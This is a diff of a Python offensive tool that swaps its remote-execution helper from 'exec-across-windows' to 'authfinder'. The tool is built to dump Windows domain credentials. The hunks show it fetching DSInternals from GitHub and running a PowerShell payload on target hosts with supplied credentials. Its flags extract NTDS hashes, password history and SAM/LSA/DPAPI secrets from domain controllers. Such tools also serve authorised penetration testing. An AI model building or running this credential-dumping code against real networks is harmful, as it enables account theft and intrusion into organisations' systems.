@@ -13,9 +13,9 @@ import time
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# check exec-across-windows exists
-if not shutil.which("exec-across-windows"):
-    print("[!] exec-across-windows not found. Install with: pipx install exec-across-windows")
+# check AuthFinder exists
+if not shutil.which("authfinder"):
+    print("[!] AuthFinder not found. Install with: pipx install authfinder")
     sys.exit(1)
 
 DSINTERNALS_URL = "https://github.com/MichaelGrafnetter/DSInternals/releases/download/v6.2/DSInternals_v6.2.zip"
@@ -559,8 +559,8 @@ if (-not $isDC -or ${str(dump_all).lower()}) {{
 '''
 
     try:
-        # Build the exec-across-windows command
-        exec_cmd = ["exec-across-windows", ip, username, password, ps_script, "--timeout", str(timeout), "--threads", "1"]
+        # Build the authfinder command
+        exec_cmd = ["authfinder", ip, username, password, ps_script, "--timeout", str(timeout), "--threads", "1"]
         
         # Run with subprocess
         if verbose:
@@ -671,7 +671,7 @@ def main_cli():
     parser.add_argument("--threads", metavar="NUM_THREADS", type=int, default=10, help="Number of concurrent threads")
     parser.add_argument("--timeout", metavar="TIMEOUT_SECONDS", type=int, default=20, help="Number of seconds before commands timeout")
     parser.add_argument("-j", "--just-dc-user",metavar='USER', dest="just_dc_user", help="Extract only one specified user")
-    parser.add_argument("-v", "--verbose", action="store_true",help="Show exec_across_windows output")
+    parser.add_argument("-v", "--verbose", action="store_true",help="Show authfinder output")
     parser.add_argument("--history", action="store_true", help="Dump user password history")
     parser.add_argument("--dump-all", action="store_true", help="Dump SAM/LSA/DPAPI on domain controllers, on top of NTDS")
 
